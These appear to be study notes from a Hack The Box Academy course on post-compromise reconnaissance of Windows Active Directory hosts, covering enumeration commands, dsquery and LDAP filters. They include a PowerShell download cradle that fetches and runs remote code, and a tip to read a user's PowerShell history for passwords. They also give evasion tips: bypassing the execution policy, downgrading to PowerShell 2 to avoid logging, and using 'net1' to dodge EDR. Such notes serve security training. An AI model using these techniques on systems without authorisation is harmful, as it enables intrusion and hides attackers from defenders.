
## Env Commands for Host & Network Recon
- `hostname` - PC Name
- `[System.Environment]::OSVersion.Version` - OS version and revision level
- `wmic qfe get Caption,Description,HotFixID,InstalledOn` - Patches and hotfixes
- `ipconfig /all` - Network adapters
- `set %USERDOMAIN%` - Domain name the host belongs to (Run from CMD)
- `set %logonserver%` - Shows the DC the host checks in with (Run from CMD)

- `systeminfo` - all of the above
___

## Harnessing Powershell
| Cmd-Let | Description |
|----------- | ------------|
`Get-Module` | Lists available modules loaded for use
`Get-ExecutionPolicy -List` | Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host
`Set-ExecutionPolicy Bypass -Scope Process` | This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.

`Get-Content C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline\ConsoleHost_history.txt` - Get the user's PowerShell history. The command history may contain passwords or point us towards configuration files or scripts that contain passwords.

`Get-ChildItem Env: | ft Key,Value` - Return environment values such as key paths, users, computer information, etc.

`powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>"` - basic download cradle

#### Downgrade Powershell
- Many defenders are unaware that several versions of PowerShell often exist on a host.
	- Unless removed they can still be used.
- We can attempt to call PowerShell version 2.0 or older which does not log events in Event Viewer.

``` powershell
powershell.exe -version 2
```
![[2023-04-19 18_03_11-Hack The Box - Academy.png|600]]
- We can check the `PowerShell Operational Log` in Event Viewer to see if logs are still being written
	- `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`
- The `Windows PowerShell` log at `Applications and Services Logs > Windows PowerShell` is also a good place to check.
	- **Note:** The version downgrade will be logged but it should be the last one.
___

## Checking Defenses

#### Firewall Checks
``` powershell
netsh advfirewall show allprofiles
```

#### Windows Defender Check (from CMD.exe)
``` cmd.exe
sc query windefend
```

#### Check Status and Configuration of Defender
``` powershell
Get-MpComputerStatus
```

#### Am I Alone?
``` powershell
qwinsta
```
- See what sessions are active. If another user is logged in and a pop up window launches or they get logged out they may notice us.
___

## Network Information
| Command | Description |
|------- | -------|
`arp -a` | List hosts stored in the arp table
`ipconfig /all` | Show adapter settings. We can figure out network segments.
`route print` | Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.
`netsh advfirewall show state` | Displays the status of the host's firewall. We can determine if it is active and filtering traffic.
___

## Windows Management Instrumentation (WMI)
- [Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)

#### Quick Checks
| Command | Description |
|------- | ------|
`wmic qfe get Caption,Description,HotFixID,InstalledOn` | Patch level and description of the Hotfixes applied
`wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List` |  Basic host information to include any attributes within the list
`wmic process list /format:list` | List all processes
`wmic ntdomain list /format:list` | Info about the Domain and DC
`wmic useraccount list /format:list` | Local accounts and any domain accounts that have logged in
`wmic group list /format:list` | Info on local groups
`wmic sysaccount list /format:list` | Dumps information about any system accounts that are being used as service accounts.
___

## Net Commands
- `net.exe` commands are usually monitored by EDR and are potentially an obvious red flag
![[2023-04-19 18_19_11-Hack The Box - Academy.png|700]]

#### Net Commands Trick
- Using `net1` instead of `net` also works and may not be monitored
___

## [Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11))
- Command line tool to find AD objects.
	- The queries we run with this can be done easily in BloodHound or PowerView but this is a LOL alternative.
- Dsquery will exist on any host with the `Active Directory Domain Services Role` installed and the DLL exists on all modern Windows systems by default at `C:\Windows\System32\dsquery.dll`

#### User Search
`dsquery user`
![[2023-04-19 18_58_25-Hack The Box - Academy.png|600]]

#### Computer Search
`dsquery computer`
![[2023-04-19 18_58_53-Hack The Box - Academy.png|600]]

#### Wildcard Search
- We can use a wildcard to view all objects in an OU for example
![[2023-04-19 18_59_46-Hack The Box - Academy.png|600]]

#### Users With Specific Attributes Set (PASSWD_NOTREQD)
- We can combine dsquery with LDAP search filters.
- The following looks for users with the PASSWD_NOTREQD(dec: 32) flag set in the [userAccountControl](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)
``` powershell
dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl
```

#### Searching for Domain Controllers (Limit 5)
``` powershell
dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName
```
___

# LDAP Filtering Explained

- You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools.

- `userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object.
	- This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/)
	- `=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that indicates Domain Contollers. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

#### UAC Values
![[Pasted image 20230419190726.png|700]]

#### OID Match Strings
- OIDs are rules used to match bit values with attributes, as seen above.
- For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`
	- Means the bit value must match completely. Good for matching a singular attribute.
2. `1.2.840.113556.1.4.804`
	- We want our results to show any attribute match if any bit in the chain matches. This covers objects with multiple attributes set.
3. `1.2.840.113556.1.4.1941`
	- This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

#### Logical Operators
- When building search strings we can use logical operators to combine values for the search.

- We can combine multiple  [search criteria](https://ldapwiki.com/wiki/LDAP#section-LDAP-LDAPSearches) with the `& (and)` operator like so:  `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`
	- The above sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change).
-  The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:  
	- `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`
- This would search for any user object that does `NOT` have the Password Can't Change attribute set.